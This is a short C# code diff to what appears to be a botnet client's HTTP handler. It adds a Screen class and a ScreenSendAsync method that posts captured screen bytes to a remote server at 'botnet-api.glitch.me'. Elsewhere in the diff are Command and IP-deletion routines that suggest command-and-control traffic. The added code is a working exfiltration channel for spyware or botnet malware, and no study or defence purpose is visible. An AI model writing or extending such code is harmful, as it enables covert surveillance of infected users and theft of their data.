@@ -13,6 +13,11 @@ namespace HttpHandler
     {
         public string ip { get; set; }
     }
+    public class Screen
+    {
+        public uint id { get; set; }
+        public byte[] bytes { get; set; }
+    }
     public class Command
     {
         public uint id { get; set; }
@@ -26,6 +31,15 @@ namespace HttpHandler
     }
     public class Class1
     {
+        public static async Task ScreenSendAsync(string Id, byte[] bt)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            Screen screen = new Screen{id = Convert.ToUInt32(Id), bytes = bt};
+            string json = new JavaScriptSerializer().Serialize(screen);
+            var resp = client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json)).Result;
+            resp.EnsureSuccessStatusCode();
+        }
         public static async Task IpDeleteAsync(string Id)
         {
             HttpClient client = new HttpClient();
